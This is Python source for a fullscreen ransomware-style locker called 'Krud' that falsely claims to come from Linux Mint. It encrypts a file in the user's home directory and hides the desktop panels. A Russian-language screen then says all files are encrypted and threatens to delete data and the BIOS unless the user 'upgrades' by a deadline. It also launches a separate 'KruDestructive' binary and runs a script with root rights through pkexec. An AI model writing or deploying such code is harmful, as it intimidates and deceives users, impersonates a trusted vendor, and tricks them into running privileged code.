#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "Linux Mint <root@linuxmint.com>"
__state__ = "linuxmint"
__version__ = '2.0'
__package__ = 'krud'

import tkinter as tk
from pathlib import Path
from tkinter import messagebox
from cryptography.fernet import Fernet
import threading
import subprocess
import os
import sys
import time
import datetime
import distro

LinuxMintVersion = (distro.version())
current = LinuxMintVersion
new = "Linux Mint 22.3 Zena"

class Krud():
    CLASS = "Krud"
    def Exit():
        CLASS1 = "Exit"
        def exitforone():
            PROGRAM_EXITED = "1"
            print(PROGRAM_EXITED)
            sys.exit(1)
        exitforone()

    def Encrypt():
        CLASS2 = "Encrypt"
        input_file = Path.home() / ".fstab"
        output_file = input_file
        key_file = Path.home() / ".krud/ENC.key"
        key = Fernet.generate_key()
        key_file.write_bytes(key)
        cipher = Fernet(key)
        data = input_file.read_bytes()
        encrypted = cipher.encrypt(data)
        output_file.write_bytes(encrypted)
    
    def Decrypt():
        CLASS3 = "Decrypt"
        encrypted_file = Path.home() / ".fstab"
        output_file = encrypted_file
        key_file = Path.home() / ".krud/ENC.key"
        key = key_file.read_bytes()
        cipher = Fernet(key)
        encrypted = encrypted_file.read_bytes()
        decrypted = cipher.decrypt(encrypted)
        output_file.write_bytes(decrypted)

def KruDestructiveRun():
    subprocess.Popen(["/usr/lib/krud/KruDestructive"])

def reboot():
        subprocess.Popen(['reboot'])

def relinfo():
        messagebox.showinfo(
            "Info",
            f"Ваша текущая версия:{current};\n Новая версия:{new}")

def upgrade():
    upgrader = "/usr/lib/krud/update.sh"
    paneld = "gsettings set org.cinnamon panels-autohide \"['2:false']\""
    def Decrypt():
        Krud.Decrypt()
        subprocess.run(paneld, shell=True)
        RebootMessage = messagebox.askyesno("Krud", "Хотите ли вы выполнить перезагрузку сейсас?")
        if RebootMessage is True:
            reboot()
    if os.path.exists(upgrader):
        try:
            if messagebox.askokcancel(
                "Krud",
                "Разрешить этому приложению вносить изменения на вашем устройстве?\n\n\nKrud Upgrader"
            ):
                proc = subprocess.run(
                    ['pkexec', 'sh', upgrader],
                    capture_output=True,
                    text=True
                )
                if proc.returncode == 0:
                    Decrypt()
                else:
                    messagebox.showerror(
                        "Krud",
                        "Вы отказали файлу обновления в правах!"
                    )
        except Exception as eror:
            messagebox.showerror(
                "Ошибка",
                f"{eror}")

def TimeOut():
    def box(text):
        l = tk.Label(
            left,
            text=text,
            bg="#8b0000",
            fg="white",
            font=("Arial", 11),
            justify="center",
            relief="solid",
            padx=10,
            pady=10
        )
        l.pack(pady=10)

    Window = tk.Tk()
    Window.attributes('-fullscreen', True)
    Window.title("Krud")
    Window.geometry("1940x1840")
    Window.configure(bg="#920000")
    left = tk.Frame(Window, bg="#8b0000", width=180)
    left.pack(side="left", fill="y")
    right = tk.Frame(Window, bg="white")
    right.pack(side="right", expand=True, fill="both")

    title = tk.Label(
        right,
        text="Лимит времени для обновления истёк!",
        fg="white",
        bg="#920505",
        font=("Arial", 18, "bold")
    )
    title.pack(fill="x")

    lock = tk.Label(
        left,
        text="🔒",
        font=("Arial", 70),
        bg="#8b0000",
        fg="white"
    )
    lock.pack(pady=20)
    box("Программа расшифровки Krud")
    text = tk.Text(
        right,
        font=("Arial", 20),
        wrap="word"
    )

    text.pack(expand=True, fill="both", padx=5, pady=5)
    text.insert("1.0",
"""
Время на выполнение обновления истекло!
Вы всё ещё можете разблокировать устройство с помощью обновления.
Однако, шанс расшифвовки ваших файлов очень мал.
Для обновления выберете "Обновиться до Linux Mint 22.3".
""")

    bottom = tk.Frame(right, bg="#9b0000")
    bottom.pack(fill="x")
    btn = tk.Button(
        bottom,
        text=f"Обновить до {new}",
        width=45,
        command=upgrade
        )

    btn.pack(side="left", padx=5, pady=8)
    Window.mainloop()


def box(text):
    l = tk.Label(
        left,
        text=text,
        bg="#8b0000",
        fg="white",
        font=("Arial", 11),
        justify="center",
        relief="solid",
        padx=10,
        pady=10
    )
    l.pack(pady=10)

app = tk.Tk()
app.attributes('-fullscreen', True)
app.title("Krud")
app.geometry("1940x1840")
app.configure(bg="#920000")
left = tk.Frame(app, bg="#8b0000", width=180)
left.pack(side="left", fill="y")
right = tk.Frame(app, bg="white")
right.pack(side="right", expand=True, fill="both")

title = tk.Label(
    right,
    text=f"Все ваши файлы зашифрованы. \n Ваше устройство заблокировано.",
    fg="white",
    bg="#920505",
    font=("Arial", 18, "bold")
)
title.pack(fill="x")

lock = tk.Label(
    left,
    text="🔒",
    font=("Arial", 70),
    bg="#8b0000",
    fg="white"
)
lock.pack(pady=20)
box("Программа расшифровки Krud")
text = tk.Text(
    right,
    font=("Arial", 20),
    wrap="word"
)

text.pack(expand=True, fill="both", padx=5, pady=5)

text.insert("1.0",
"""
Что случилось с моим компьютером?
Все ваши файлы зашифрованы. Ваше компьютер заблокирован.
Мы вам не рекомендуем перезагружать или выключать.
Если вы перезагрузите компьютер, вы больше не сможете войти в систему.

Расшифровать и разблокировать устройство возможно. 
Вам нужно обновить Linux Mint до версии 22.3
У вас те так уж достаточно времени.
Ключ расшифровки будет удалён через 7 дней.

Для обновления выберете "Обновиться до Linux Mint 22.3".
Для получения информации о релизе выберете "Информация о релизе".
Для перезагрузки компьютера выберете "Перезагрузить компьютер".
Если вы не обновите Linux Mint до версии 22.3 до 10.09.2026. все данные включая Linux и BIOS будут удалены и устройство будет заблокировано навсегда.
""")

bottom = tk.Frame(right, bg="#9b0000")
bottom.pack(fill="x")

btn = tk.Button(
    bottom,
    text=f"Обновить до {new}",
    width=45,
    command=upgrade)

btntree = tk.Button(
    bottom,
    text="Перезагрузить компьютер",
    width=45,
    command=reboot)

btntwo = tk.Button(
    bottom,
    text="Информация о релизе",
    width=45,
    command=relinfo)

btn.pack(side="left", padx=5, pady=8)
btntree.pack(side="left", padx=5, pady=8)
btntwo.pack(side="left", padx=5, pady=8)

def mainloop():
    panelhide = "gsettings set org.cinnamon panels-autohide \"['1:true']\""
    subprocess.run(panelhide, shell=True)
    Krud.Encrypt()
    currentime = time.time()
    logname = Path.home() / ".krud" / f"{int(time.time())}.txt"
    with open(logname, "w", encoding="utf-8") as file:
        file.write(f"#\nProgram started at {currentime}.\nAll Files are encrypted.\nExit.\n#\n\n\n\n")

    thread = threading.Thread(target=KruDestructiveRun)
    thread.start()
    app.mainloop()

def get_sysinfo_start():
    mint_version = distro.version()
    current_date = datetime.datetime.now().strftime("%d%m%Y")
    if mint_version == "22.3":
        sys.exit(1)
    elif current_date >= "10092026":
        TimeOut()
    elif mint_version < "22.3" and current_date < "10092026":
        mainloop()

if __name__ == "__main__":
    get_sysinfo_start()
